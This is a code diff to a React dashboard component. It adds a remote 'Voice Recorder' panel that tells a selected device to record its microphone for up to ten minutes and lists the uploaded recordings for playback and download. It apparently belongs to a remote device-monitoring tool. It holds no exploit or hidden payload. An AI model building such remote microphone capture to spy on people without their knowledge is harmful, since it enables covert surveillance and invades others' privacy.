@@ -180,6 +180,14 @@ export default function Home() {
     const [isMuted, setIsMuted] = useState(false);
     const [audioLevel, setAudioLevel] = useState(0);
     const [audioElapsed, setAudioElapsed] = useState(0);
+
+    // Voice Recording State
+    const [isVoiceRecording, setIsVoiceRecording] = useState(false);
+    const [voiceRecDuration, setVoiceRecDuration] = useState(60); // seconds
+    const [voiceRecProgress, setVoiceRecProgress] = useState({ current: 0, total: 0 });
+    const [voiceRecordings, setVoiceRecordings] = useState<{ url: string; duration: number; timestamp: number }[]>([]);
+    const [playingRecUrl, setPlayingRecUrl] = useState<string | null>(null);
+    const voiceRecTimerRef = useRef<NodeJS.Timeout | null>(null);
     const [audioError, setAudioError] = useState<string | null>(null);
     const audioContextRef = useRef<AudioContext | null>(null);
     const audioGainRef = useRef<GainNode | null>(null);
@@ -682,6 +690,19 @@ export default function Home() {
                 setTimeout(() => setAudioError(null), 5000);
             });
 
+            // Voice Recording Ready — device finished recording, server uploaded to R2
+            socket.on("voice_recording_ready", (data: any) => {
+                if (data.url) {
+                    setVoiceRecordings(prev => [{ url: data.url, duration: data.duration || 0, timestamp: data.timestamp || Date.now() }, ...prev]);
+                }
+                setIsVoiceRecording(false);
+                setVoiceRecProgress({ current: 0, total: 0 });
+                if (voiceRecTimerRef.current) {
+                    clearInterval(voiceRecTimerRef.current);
+                    voiceRecTimerRef.current = null;
+                }
+            });
+
             // Load cached images instantly for fast UX
             const GALLERY_CACHE_KEY = `gallery_images_${uuid}`;
             try {
@@ -977,6 +998,48 @@ export default function Home() {
         setIsLiveAudio(false);
         setAudioLevel(0);
         setAudioElapsed(0);
+    }, [socket, selectedDeviceId, session]);
+
+    // --- Voice Recording Functions ---
+    const startVoiceRecording = useCallback(() => {
+        if (!socket || !selectedDeviceId || !session?.user?.uuid) {
+            setAlertData({ title: 'No Device', message: 'Please select an online device first.', type: 'warning' });
+            setShowCustomAlert(true);
+            return;
+        }
+        socket.emit('start_voice_recording', {
+            uuid: session.user.uuid,
+            targetDeviceId: selectedDeviceId,
+            duration: voiceRecDuration
+        });
+        setIsVoiceRecording(true);
+        setVoiceRecProgress({ current: 0, total: voiceRecDuration });
+
+        // Local progress timer
+        let elapsed = 0;
+        voiceRecTimerRef.current = setInterval(() => {
+            elapsed++;
+            setVoiceRecProgress(prev => ({ ...prev, current: elapsed }));
+            if (elapsed >= voiceRecDuration) {
+                clearInterval(voiceRecTimerRef.current!);
+                voiceRecTimerRef.current = null;
+            }
+        }, 1000);
+    }, [socket, selectedDeviceId, session, voiceRecDuration]);
+
+    const stopVoiceRecording = useCallback(() => {
+        if (socket && selectedDeviceId && session?.user?.uuid) {
+            socket.emit('stop_voice_recording', {
+                uuid: session.user.uuid,
+                targetDeviceId: selectedDeviceId
+            });
+        }
+        setIsVoiceRecording(false);
+        setVoiceRecProgress({ current: 0, total: 0 });
+        if (voiceRecTimerRef.current) {
+            clearInterval(voiceRecTimerRef.current);
+            voiceRecTimerRef.current = null;
+        }
     }, [socket, selectedDeviceId, session]);
 
     // Update gain when volume/mute changes
@@ -2275,6 +2338,132 @@ END:VCARD`;
                                         </p>
                                     </div>
                                 </div>
+                            </div>
+
+                            {/* Voice Recording Section */}
+                            <div className="bg-gray-900 border border-white/10 rounded-xl overflow-hidden">
+                                {/* Header */}
+                                <div className="px-4 py-3 border-b border-white/10 flex items-center justify-between bg-black/40">
+                                    <div className="flex items-center gap-2">
+                                        <div className={`w-2.5 h-2.5 rounded-full ${isVoiceRecording ? 'bg-red-500 animate-pulse' : 'bg-white/20'}`} />
+                                        <span className="text-sm font-mono text-white/70">
+                                            {isVoiceRecording ? `REC • ${formatTime(voiceRecProgress.current)}` : 'VOICE RECORDER'}
+                                        </span>
+                                    </div>
+                                    {isVoiceRecording && (
+                                        <span className="text-xs text-red-400/70 font-mono">{formatTime(voiceRecProgress.total - voiceRecProgress.current)} left</span>
+                                    )}
+                                </div>
+
+                                {/* Duration Selector + Controls */}
+                                <div className="p-4 space-y-3">
+                                    {/* Duration Options */}
+                                    {!isVoiceRecording && (
+                                        <div className="flex gap-2">
+                                            {[{ label: '1 Min', value: 60 }, { label: '5 Min', value: 300 }, { label: '10 Min', value: 600 }].map(opt => (
+                                                <button
+                                                    key={opt.value}
+                                                    onClick={() => setVoiceRecDuration(opt.value)}
+                                                    className={`flex-1 py-2 rounded-lg text-sm font-bold transition-all ${
+                                                        voiceRecDuration === opt.value
+                                                            ? 'bg-red-500 text-white shadow-lg shadow-red-500/20'
+                                                            : 'bg-white/10 text-white/50 hover:bg-white/15 hover:text-white/70'
+                                                    }`}
+                                                >
+                                                    {opt.label}
+                                                </button>
+                                            ))}
+                                        </div>
+                                    )}
+
+                                    {/* Progress Bar */}
+                                    {isVoiceRecording && (
+                                        <div className="space-y-2">
+                                            <div className="h-2 bg-white/10 rounded-full overflow-hidden">
+                                                <div
+                                                    className="h-full bg-red-500 rounded-full transition-all duration-1000"
+                                                    style={{ width: `${(voiceRecProgress.current / voiceRecProgress.total) * 100}%` }}
+                                                />
+                                            </div>
+                                            <div className="flex justify-between text-xs text-white/40 font-mono">
+                                                <span>{formatTime(voiceRecProgress.current)}</span>
+                                                <span>{formatTime(voiceRecProgress.total)}</span>
+                                            </div>
+                                        </div>
+                                    )}
+
+                                    {/* Start/Stop Button */}
+                                    <button
+                                        onClick={() => isVoiceRecording ? stopVoiceRecording() : startVoiceRecording()}
+                                        className={`w-full py-3 rounded-xl font-bold text-sm flex items-center justify-center gap-2 transition-all ${
+                                            isVoiceRecording
+                                                ? 'bg-red-600 text-white hover:bg-red-500'
+                                                : 'bg-gradient-to-r from-red-600 to-orange-600 text-white hover:from-red-500 hover:to-orange-500'
+                                        }`}
+                                        disabled={!selectedDeviceId}
+                                    >
+                                        {isVoiceRecording ? (
+                                            <>
+                                                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><rect x="6" y="6" width="12" height="12" rx="2" /></svg>
+                                                Stop Recording
+                                            </>
+                                        ) : (
+                                            <>
+                                                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><circle cx="12" cy="12" r="6" /></svg>
+                                                Record Voice
+                                            </>
+                                        )}
+                                    </button>
+                                </div>
+
+                                {/* Recordings List */}
+                                {voiceRecordings.length > 0 && (
+                                    <div className="border-t border-white/10">
+                                        <div className="px-4 py-2 bg-black/40">
+                                            <span className="text-xs font-medium text-white/50">Recordings ({voiceRecordings.length})</span>
+                                        </div>
+                                        <div className="max-h-48 overflow-y-auto divide-y divide-white/5">
+                                            {voiceRecordings.map((rec, idx) => (
+                                                <div key={idx} className="px-4 py-2.5 flex items-center justify-between hover:bg-white/5">
+                                                    <div className="flex items-center gap-3">
+                                                        <button
+                                                            onClick={() => setPlayingRecUrl(playingRecUrl === rec.url ? null : rec.url)}
+                                                            className={`w-8 h-8 rounded-full flex items-center justify-center transition-all ${
+                                                                playingRecUrl === rec.url ? 'bg-red-500 text-white' : 'bg-white/10 text-white/60 hover:bg-white/20'
+                                                            }`}
+                                                        >
+                                                            {playingRecUrl === rec.url ? (
+                                                                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><rect x="6" y="6" width="12" height="12" rx="1" /></svg>
+                                                            ) : (
+                                                                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M8 5v14l11-7z" /></svg>
+                                                            )}
+                                                        </button>
+                                                        <div>
+                                                            <p className="text-sm text-white/80 font-medium">{formatTime(rec.duration)}</p>
+                                                            <p className="text-xs text-white/30">{new Date(rec.timestamp).toLocaleTimeString()}</p>
+                                                        </div>
+                                                    </div>
+                                                    <a href={rec.url} download className="p-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-white/40 hover:text-white/70 transition-colors">
+                                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" /></svg>
+                                                    </a>
+                                                </div>
+                                            ))}
+                                        </div>
+                                        {/* Audio Player */}
+                                        {playingRecUrl && (
+                                            <div className="px-4 py-2 border-t border-white/10 bg-black/40">
+                                                <audio
+                                                    src={playingRecUrl}
+                                                    controls
+                                                    autoPlay
+                                                    onEnded={() => setPlayingRecUrl(null)}
+                                                    className="w-full h-8"
+                                                    style={{ filter: 'invert(1) hue-rotate(180deg)', opacity: 0.8 }}
+                                                />
+                                            </div>
+                                        )}
+                                    </div>
+                                )}
                             </div>
                         </div>
                     )}
